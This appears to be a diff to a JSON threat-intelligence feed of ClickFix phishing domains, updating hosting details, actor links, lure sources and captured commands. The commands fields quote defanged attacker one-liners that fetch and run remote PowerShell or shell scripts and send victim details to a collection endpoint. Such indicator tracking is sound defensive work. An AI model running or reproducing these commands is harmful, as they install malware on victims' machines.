@@ -35676,6 +35676,55 @@
    ]
   },
   {
+   "indicator": "bergmalerei.de",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-10-26",
+   "last_seen": "2026-11-05",
+   "last_online": "2026-11-07",
+   "offline_since": null,
+   "url": "https://www.bergmalerei.de/",
+   "brand": null,
+   "product": null,
+   "hosting": "IONOS",
+   "dns": "IONOS",
+   "ip": "2001:8d8:100f:f000::2eb",
+   "asn": "AS8560",
+   "org": "IONOS-AS IONOS SE, DE",
+   "country": "DE",
+   "ips": [
+    {
+     "ip": "2001:8d8:100f:f000::2eb",
+     "asn": "AS8560",
+     "org": "IONOS-AS IONOS SE, DE",
+     "first_seen": "2026-10-26",
+     "last_seen": "2026-11-05"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "www.bergmalerei.de",
+     "status": "online",
+     "first_seen": "2026-10-26",
+     "last_seen": "2026-11-05"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'id-verfied.boats/[id]'|iex;"
+   ],
+   "connects_to": [
+    "id-verfied.boats"
+   ],
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
+  },
+  {
    "indicator": "beritaupdate360.com",
    "type": "domain",
    "category": "clickfix",
@@ -36788,7 +36837,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -48323,17 +48373,18 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null"
    ],
    "connects_to": [
     "xorados.com",
     "t-trustrest.com",
     "hagosuro.lc",
-    "groverudder12.com",
     "trek-72.com",
+    "groverudder12.com",
     "jscdncloude.beer",
     "trustchecknes.com",
+    "t-trustresnew.com",
     "lepafonso.bz"
    ],
    "lure_from": [
@@ -59993,12 +60044,15 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit"
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
+    "curl -sL -d \"id=e7ab03e7-c0cc-4ff0-bf68-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fcofeservice.ru%2F&os=Mac%2015&lastVisitAt=2026-11-07T17%3A10%3A55.427Z&lastShellAt=2026-11-07T17%3A10%3A55.427Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=e5c7ff60-6c36-4559-89ff-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fcofeservice.ru%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-07T17%3A07%3A13.922Z\"\" -d \"\"lastShellAt=2026-11-07T17%3A07%3A13.922Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
+    "codes.browse-cdn.beer",
     "ncheck-brows.beer"
    ]
   },
@@ -66250,8 +66304,8 @@
     "nikogdatakonebilo.cc",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
-    "ciganshina.org",
-    "pakistanskimalchik.org"
+    "yaponovosh.org",
+    "ciganshina.org"
    ]
   },
   {
@@ -74319,7 +74373,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -106337,12 +106392,15 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit"
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
+    "curl -sL -d \"id=a50c26d3-43ce-4c81-a0cb-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fgowcar.com%2F&os=Mac%2015&lastVisitAt=2026-11-07T17%3A10%3A50.945Z&lastShellAt=2026-11-07T17%3A10%3A50.945Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=8c5bc39d-5cf0-4668-9db1-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fgowcar.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-07T17%3A07%3A05.439Z\"\" -d \"\"lastShellAt=2026-11-07T17%3A07%3A05.439Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
+    "codes.browse-cdn.beer",
     "ncheck-brows.beer"
    ]
   },
@@ -109076,57 +109134,6 @@
    "lure_from": []
   },
   {
-   "indicator": "guiacms.com",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": "device-code-lab",
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-26",
-   "last_seen": "2026-11-05",
-   "last_online": "2026-11-07",
-   "offline_since": null,
-   "url": "https://guiacms.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Hostinger",
-   "dns": "dns-parking.com",
-   "ip": "147.93.39.17",
-   "asn": "AS47583",
-   "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "BR",
-   "ips": [
-    {
-     "ip": "147.93.39.17",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-10-26",
-     "last_seen": "2026-11-05"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "guiacms.com",
-     "status": "online",
-     "first_seen": "2026-10-26",
-     "last_seen": "2026-11-05"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'ncheck-brows[.]beer/[id]'|iex;",
-    "irm 'id-verfied.boats/[id]'|iex;"
-   ],
-   "connects_to": [
-    "ncheck-brows.beer",
-    "id-verfied.boats"
-   ],
-   "lure_from": [
-    "codes.caffe-img.com"
-   ]
-  },
-  {
    "indicator": "guilenia.com",
    "type": "domain",
    "category": "clickfix",
@@ -109217,7 +109224,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -112465,7 +112473,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -114504,7 +114513,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -119915,7 +119925,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -120788,7 +120799,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -122598,7 +122610,8 @@
    "commands": [],
    "connects_to": [],
    "lure_from": [
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -136042,7 +136055,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -136237,7 +136251,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -139978,7 +139993,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -140589,7 +140605,8 @@
     "ubbrobccheck20.cc"
    ],
    "lure_from": [
-    "verifyidentrob01.cc"
+    "verifyidentrob01.cc",
+    "fudcomcheck.art"
    ]
   },
   {
@@ -142365,6 +142382,7 @@
     "nikogdatakonebilo.cc",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
+    "yaponovosh.org",
     "ciganshina.org",
     "pakistanskimalchik.org",
     "ktoktotam.cc"
@@ -144599,7 +144617,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -145075,7 +145094,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -147106,7 +147126,8 @@
     "code.nvc-info.beer"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -147269,7 +147290,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -148777,7 +148799,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -150108,23 +150131,25 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "xorados.com",
     "t-trustrest.com",
     "hagosuro.lc",
-    "groverudder12.com",
     "trek-72.com",
+    "groverudder12.com",
     "trustchecknes.com",
+    "t-trustresnew.com",
     "lepafonso.bz"
    ],
    "lure_from": [
     "interseq.at",
     "id-verfied.boats",
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -154732,7 +154757,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -159227,7 +159253,8 @@
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "trustchecknes.com"
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at",
@@ -159276,11 +159303,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "t-trustresnew.com",
     "trustchecknes.com"
    ],
    "lure_from": [
@@ -160035,7 +160063,8 @@
     "assetwaveapp.com",
     "bannerware.net",
     "trackbaseneo.net",
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -162480,8 +162509,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=debf8a3c-9a05-43ea-9859-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.morganaorvokki.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-02T11%3A29%3A55.432Z\"\" -d \"\"lastShellAt=2026-11-02T11%3A29%3A55.432Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=e678a92b-8dd2-4b36-8c13-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.morganaorvokki.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T21%3A02%3A32.344Z\"\" -d \"\"lastShellAt=2026-10-31T21%3A02%3A32.344Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=f926c138-2802-451c-9f91-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww.morganaorvokki.com%2F&os=Mac%2015&lastVisitAt=2026-11-07T17%3A40%3A43.118Z&lastShellAt=2026-11-07T17%3A40%3A43.118Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=bf8f3eba-1020-431f-a419-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.morganaorvokki.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-07T17%3A33%3A30.693Z\"\" -d \"\"lastShellAt=2026-11-07T17%3A33%3A30.693Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -162491,6 +162520,7 @@
     "eventwireix.com",
     "metricserveonline.com",
     "ncheck-brows.beer",
+    "codes.browse-cdn.beer",
     "id-verfied.boats",
     "codes.caffe-img.com"
    ]
@@ -165897,8 +165927,8 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
@@ -165906,12 +165936,14 @@
     "trek-72.com",
     "t-trustrest.com",
     "trustchecknes.com",
+    "t-trustresnew.com",
     "jscdncloude.beer"
    ],
    "lure_from": [
     "interseq.at",
     "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -177619,12 +177651,13 @@
    "actor_link": null,
    "commands": [
     "irm 'hxxps[:]//towinginculvercity[.]com/update.php?webhook=[id]' | iex;",
-    "irm 'hxxps[:]//rggdrh[.]site/v2_hFBW5NjU_A_--8uQ=[id]' | iex;",
-    "irm 'hxxps[:]//sfesfes[.]world/v2_DiZs0t-FRLUVN4nS=[id]' | iex;"
+    "irm 'hxxps[:]//err12[.]online/v2_dTW7KCWkYslyKkzz=[id]' | iex;",
+    "irm 'hxxps[:]//rggdrh[.]site/v2_hFBW5NjU_A_--8uQ=[id]' | iex;"
    ],
    "connects_to": [
     "sfesfes.world",
     "towinginculvercity.com",
+    "err12.online",
     "rggdrh.site",
     "humzazahid.com",
     "islandmartialarts.com",
@@ -184984,7 +185017,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -227480,7 +227514,8 @@
     "trek-72.com",
     "hagosuro.lc",
     "t-trustrest.com",
-    "trustchecknes.com"
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -228925,7 +228960,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -257704,15 +257740,16 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
     "hagosuro.lc",
     "t-trustrest.com",
-    "trustchecknes.com"
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
